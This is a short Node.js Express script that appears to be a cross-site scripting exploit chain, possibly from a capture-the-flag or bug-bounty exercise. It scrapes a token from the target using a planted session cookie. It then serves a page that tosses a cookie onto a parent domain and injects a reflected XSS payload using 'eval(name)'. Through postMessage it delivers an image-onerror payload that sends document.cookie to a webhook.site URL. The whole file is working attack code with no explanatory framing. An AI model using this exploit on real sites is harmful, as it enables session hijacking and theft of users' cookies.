const express = require('express')
const app = express()
const fetch = (...args) => import("node-fetch").then(module => module.default(...args));
const port = 8899

const subdomain = "https://domain.com/";
const maindomain = "https://sub.domain.com/";

var x= '';

async function get_token() {
  const opts = {
    headers: {
        cookie: '__Host-PHPSESSID=1'
    }};
const response = await fetch(maindomain, opts);
const body = await response.text();
x=body.substr(body.indexOf('identifier')+14,24)
}

app.get('/', async (req, res) => {
await get_token();


res.send(`

<script>

const xss_payload=\`

document.cookie='..Host-PHPSESSID=1; domain=.4z.is';
var win = window.open('${maindomain}','win');
setTimeout(()=>{
win.frames[0].postMessage({
                identifier: '${x}',
                type: 'render',
                body: '<img src=x onerror=fetch("https://webhook.site/xxx?cookies="+document.cookie)>',
            }, '*');
},1000)

\`;

window.open('${subdomain}?x=%26quot;);eval(name)//%3C/script%3E%3Csvg%3E',xss_payload)
</script>

`)

})

app.listen(port, '0.0.0.0', () => {
  console.log(`apps listening at port ${port}`)
})